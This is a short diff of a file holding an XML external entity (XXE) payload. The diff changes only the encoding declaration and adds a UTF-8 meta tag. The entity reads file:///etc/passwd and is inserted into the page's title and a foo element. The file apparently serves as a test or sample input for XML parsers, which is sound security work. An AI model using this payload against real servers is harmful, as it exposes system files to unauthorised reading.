@@ -1,9 +1,10 @@
-<?xml  version="1.0" encoding="ISO-8859-1"?>
+<?xml  version="1.0"?>
 <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
 <html>
 <head>
+   <meta http-equiv="content-type" content="text/html; charset=UTF-8">
   <title>&xxe;</title>
 </head>
   <foo>&xxe;</foo>
